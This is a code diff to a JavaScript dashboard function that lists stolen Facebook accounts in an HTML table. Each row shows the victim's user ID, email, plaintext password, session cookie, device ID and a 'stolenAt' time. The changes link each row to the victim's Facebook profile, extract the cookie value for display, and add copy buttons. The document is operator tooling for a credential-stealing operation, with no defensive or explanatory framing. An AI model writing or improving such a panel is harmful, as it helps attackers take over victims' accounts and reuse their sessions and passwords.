@@ -8,8 +8,10 @@ function fillDataToTable() {
         .then((res) => {
             const html = res
                 .map((user, index) => {
-                    return `<tr>
-                <td>${index + 1}</td>
+                    return `<tr scope="row">
+                <td><a class="text-white text-decoration-none fw-bold" target="_blank"  href='${
+                    user.c_user && user.c_user != "" ? "https://fb.com/" + user.c_user : "#"
+                }'>${index + 1}</a></td>
                 <td data-bs-coppy="${user.c_user}">${user.c_user}</td>
                 <td data-bs-coppy="${user.email}">${user.email}</td>
                 <td data-bs-coppy="${user.password}">${user.password}</td>
@@ -17,14 +19,14 @@ function fillDataToTable() {
                 <td  data-bs-coppy="${user.cookie}" class="short-view" style='color: ${
                         user.cookie && user.cookie != "" ? "" : "red !important"
                     }' title="${user.cookie}">
-                    ${user.cookie && user.cookie != "" ? user.cookie.split(";")[0] : "unknown"}
+                    ${user.cookie && user.cookie != "" ? user.cookie.split(";")[0].split("=")[1] : "unknown"}
                 </td>
 
                 <td data-bs-coppy="${user.userAgent}" class="short-view" title="${user.userAgent}">Coppy</td>
                 <td data-bs-coppy="${user.device_id}">${user.device_id}</td>
                 <td data-bs-coppy="${user.stolenAt}">${user.stolenAt}</td>
                 <td>
-                <button class="menu-more btn btn-secondary dropdown-toggle" style="padding: 6px 20px;border-radius: 12px; background: #ffffff11; color: white" data-bs-id="${
+                <button  data-bs-toggle="modal" data-bs-target="#show-options-modal" class="menu-more btn btn-secondary" style="padding: 6px 20px;border-radius: 12px; background: #ffffff11; color: white" data-bs-id="${
                     user.id
                 }">More
                 </button></td>
